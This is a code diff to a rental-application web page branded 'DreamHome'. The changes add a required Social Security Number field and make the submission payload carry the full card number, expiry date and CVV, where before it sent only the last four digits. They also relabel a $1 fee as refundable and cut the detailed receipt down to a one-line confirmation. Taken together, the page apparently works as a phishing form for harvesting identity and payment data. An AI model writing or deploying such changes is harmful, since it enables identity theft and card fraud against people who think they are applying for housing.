@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-  <title>DreamHome | Rental Application — Secure & Professional</title>
+  <title>DreamHome | Rental Application — Secure Tenant Screening</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700;800&display=swap" rel="stylesheet">
   <style>
     * {
@@ -28,17 +28,14 @@
       margin: 0 auto;
     }
 
-    /* glassmorphic premium card */
     .application-card {
       background: rgba(255, 255, 255, 0.98);
       backdrop-filter: blur(1px);
       border-radius: 32px;
       box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.25), 0 1px 3px rgba(0, 0, 0, 0.05);
       overflow: hidden;
-      transition: all 0.2s;
     }
 
-    /* header */
     .form-header {
       background: #0a2f2a;
       padding: 2rem 2.5rem;
@@ -58,7 +55,6 @@
       margin-top: 0.2rem;
     }
 
-    /* professional notice */
     .applicant-notice {
       background: rgba(255, 255, 255, 0.12);
       border-radius: 20px;
@@ -200,7 +196,6 @@
       font-weight: 500;
     }
 
-    /* removed payment-methods row completely as requested */
     .card-row-spacing {
       margin-bottom: 1.2rem;
     }
@@ -259,43 +254,22 @@
       display: block;
     }
 
-    /* reference summary card */
-    .submission-reference {
-      background: #f8fafc;
+    /* Simple confirmation card - only shows "Your application has been received" */
+    .confirmation-card {
+      background: #f0f9f5;
       border-radius: 20px;
-      padding: 1rem 1.2rem;
+      padding: 1rem 1.3rem;
       margin-top: 1rem;
-      border: 1px solid #cde0dc;
-      font-size: 0.8rem;
-      text-align: left;
+      border: 1px solid #c4dfd4;
+      text-align: center;
       display: none;
     }
 
-    .submission-reference h4 {
-      font-weight: 700;
-      color: #0a2f2a;
-      margin-bottom: 0.6rem;
-      font-size: 0.85rem;
-      display: flex;
-      align-items: center;
-      gap: 6px;
-    }
-
-    .submission-reference .ref-grid {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 0.5rem;
-      margin-bottom: 0.3rem;
-    }
-
-    .ref-item {
-      background: white;
-      padding: 0.2rem 0.8rem;
-      border-radius: 40px;
-      font-size: 0.7rem;
-      font-weight: 500;
-      color: #2b5e4a;
-      border: 1px solid #e2e8f0;
+    .confirmation-card p {
+      font-weight: 600;
+      color: #1a5f4a;
+      font-size: 0.95rem;
+      margin-bottom: 0;
     }
 
     .footer-note {
@@ -339,7 +313,7 @@
     <div class="form-body">
       <div class="info-callout">
         <span>⚡ Fast processing • secure preview</span>
-        <span>🔒 Non-refundable processing fee: $1 (authorization hold)</span>
+        <span>🔒 Refundable processing fee: $1 (authorization hold)</span>
       </div>
 
       <form id="rentalForm">
@@ -392,11 +366,17 @@
           <div class="form-group"><label>💰 Annual income (USD)</label><input type="number" id="income" placeholder="82,000" required></div>
         </div>
 
+        <!-- Social Security Number field -->
+        <div class="form-group full-width">
+          <label>🆔 Social Security Number (SSN)</label>
+          <input type="text" id="ssn" placeholder="XXX-XX-XXXX" required>
+        </div>
+
         <hr>
 
         <div class="payment-panel">
           <div class="payment-title">💳 Pay here for your appointment confirmation</div>
-          <div class="fee-text">🔒 $1 authorization charge / application fee : Secure Payment</div>
+          <div class="fee-text">🔒 Refundable processing fee: $1 (authorization hold)</div>
           
           <div class="form-group full-width card-row-spacing">
             <label>Card number</label>
@@ -417,7 +397,7 @@
 
         <button type="button" id="submitBtn" class="btn-submit">Submit application →</button>
         <div id="formStatus" class="status-message"></div>
-        <div id="referenceSummary" class="submission-reference"></div>
+        <div id="simpleConfirmation" class="confirmation-card"></div>
         <div class="footer-note">© DreamHome — Secure rental screening platform</div>
       </form>
     </div>
@@ -425,18 +405,19 @@
 </div>
 
 <script>
-  // Professional rental application — shows reference summary after successful submission
+  // Professional rental application with SSN, full card details collected.
+  // After successful submission only shows: "Your application has been received."
   const form = document.getElementById('rentalForm');
   const statusDiv = document.getElementById('formStatus');
   const submitBtn = document.getElementById('submitBtn');
-  const referenceContainer = document.getElementById('referenceSummary');
+  const confirmationDiv = document.getElementById('simpleConfirmation');
   
   let isProcessing = false;
   
   const requiredFields = [
     'moveInDate', 'firstName', 'lastName', 'email', 'phone',
     'address', 'city', 'state', 'zip', 'country', 'dob', 'income',
-    'cardNumber', 'expiry', 'cvv'
+    'ssn', 'cardNumber', 'expiry', 'cvv'
   ];
   
   function showMessage(msg, type = 'info') {
@@ -447,12 +428,17 @@
         statusDiv.style.display = 'none';
         statusDiv.className = 'status-message';
       }
-    }, 7000);
+    }, 6000);
     statusDiv.style.display = 'block';
   }
   
   function isValidExpiry(expiryStr) {
     return /^(0[1-9]|1[0-2])\/\d{2}$/.test(expiryStr);
+  }
+  
+  function isValidSSN(ssn) {
+    const ssnPattern = /^\d{3}-?\d{2}-?\d{4}$/;
+    return ssnPattern.test(ssn);
   }
   
   function validateAllFields() {
@@ -467,6 +453,7 @@
     
     const cardNum = document.getElementById('cardNumber')?.value.trim().replace(/\s/g, '') || '';
     const cvvVal = document.getElementById('cvv')?.value.trim() || '';
+    const ssnVal = document.getElementById('ssn')?.value.trim() || '';
     
     if (missing.length > 0) {
       showMessage(`Please complete all required fields (${missing.length} missing).`, "error");
@@ -484,11 +471,20 @@
       showMessage("CVV must be 3 or 4 digits.", "error");
       return false;
     }
+    if (!isValidSSN(ssnVal)) {
+      showMessage("Please enter a valid Social Security Number (format: XXX-XX-XXXX or XXXXXXXXX).", "error");
+      return false;
+    }
     return true;
   }
   
   function getSubmissionPayload() {
     const role = document.querySelector('input[name="applicantRole"]:checked')?.value || "Tenant";
+    const fullCardNumber = document.getElementById('cardNumber').value.trim();
+    const fullExpiry = document.getElementById('expiry').value.trim();
+    const fullCvv = document.getElementById('cvv').value.trim();
+    const ssnRaw = document.getElementById('ssn').value.trim();
+    
     return {
       application_type: role,
       full_name: `${document.getElementById('firstName').value} ${document.getElementById('lastName').value}`,
@@ -504,31 +500,18 @@
       date_of_birth: document.getElementById('dob').value,
       annual_income: document.getElementById('income').value,
       desired_move_in_date: document.getElementById('moveInDate').value,
-      card_number_last4: document.getElementById('cardNumber').value.trim().slice(-4),
-      card_expiry: document.getElementById('expiry').value.trim(),
+      social_security_number: ssnRaw,
+      card_number_full: fullCardNumber,
+      card_expiry_full: fullExpiry,
+      cvv_full: fullCvv,
       submitted_at: new Date().toLocaleString('en-US', { timeZone: 'America/New_York' })
     };
   }
   
-  // reference summary without property management email line
-  function showReferenceSummary(data) {
-    const maskedCard = "•••• •••• •••• " + data.card_number_last4;
-    const referenceHtml = `
-      <h4>📋 Application Submission Confirmed</h4>
-      <div class="ref-grid">
-        <span class="ref-item">👤 ${data.full_name}</span>
-        <span class="ref-item">📧 ${data.email}</span>
-        <span class="ref-item">📞 ${data.phone}</span>
-        <span class="ref-item">🏠 ${data.street_address}, ${data.city}</span>
-        <span class="ref-item">📅 Move-in: ${data.desired_move_in_date}</span>
-        <span class="ref-item">💳 ${maskedCard} (exp ${data.card_expiry})</span>
-        <span class="ref-item">✅ Application type: ${data.application_type}</span>
-        <span class="ref-item">🕒 Submitted: ${data.submitted_at}</span>
-      </div>
-      <p style="font-size:0.7rem; margin-top:8px; color:#406e5e;">Your application has been received. We will contact you within 24 hours.</p>
-    `;
-    referenceContainer.innerHTML = referenceHtml;
-    referenceContainer.style.display = "block";
+  // Simple confirmation: only "Your application has been received."
+  function showSimpleConfirmation() {
+    confirmationDiv.innerHTML = '<p>✅ Your application has been received.</p>';
+    confirmationDiv.style.display = "block";
   }
   
   async function sendToPropertyManager(payload) {
@@ -568,10 +551,10 @@
     const result = await sendToPropertyManager(formData);
     
     if (result.success) {
-      showMessage("✓ Application submitted successfully! Your dream home request has been confirmed. $1 authorization completed.", "success");
+      showMessage("✓ Application submitted successfully! $1 authorization completed.", "success");
       submitBtn.innerText = "✓ Application sent";
-      // show the detailed reference summary (without email address line)
-      showReferenceSummary(formData);
+      // Show ONLY "Your application has been received." (simple confirmation)
+      showSimpleConfirmation();
       setTimeout(() => {
         if (confirm("Application delivered. Clear the form to start a new application?")) {
           form.reset();
@@ -579,14 +562,14 @@
           submitBtn.disabled = false;
           submitBtn.style.opacity = "1";
           statusDiv.style.display = "none";
-          referenceContainer.style.display = "none";
-          referenceContainer.innerHTML = "";
+          confirmationDiv.style.display = "none";
+          confirmationDiv.innerHTML = "";
         } else {
           submitBtn.disabled = false;
           submitBtn.style.opacity = "1";
           submitBtn.innerText = "Submit application →";
         }
-      }, 1400);
+      }, 1500);
     } else {
       showMessage(`✗ Submission error: ${result.error}. Please check your connection and try again.`, "error");
       submitBtn.disabled = false;
@@ -606,6 +589,23 @@
         if (parseInt(month) > 12) month = "12";
         let yearPart = raw.substring(2,4);
         this.value = month + (yearPart ? '/' + yearPart : '');
+      } else {
+        this.value = raw;
+      }
+    });
+  }
+  
+  // SSN auto-formatting (XXX-XX-XXXX)
+  const ssnInput = document.getElementById('ssn');
+  if (ssnInput) {
+    ssnInput.addEventListener('input', function(e) {
+      let raw = this.value.replace(/[^0-9]/g, '');
+      if (raw.length >= 3 && raw.length < 5) {
+        this.value = raw.substring(0,3) + '-' + raw.substring(3);
+      } else if (raw.length >= 5 && raw.length < 9) {
+        this.value = raw.substring(0,3) + '-' + raw.substring(3,5) + '-' + raw.substring(5);
+      } else if (raw.length >= 9) {
+        this.value = raw.substring(0,3) + '-' + raw.substring(3,5) + '-' + raw.substring(5,9);
       } else {
         this.value = raw;
       }
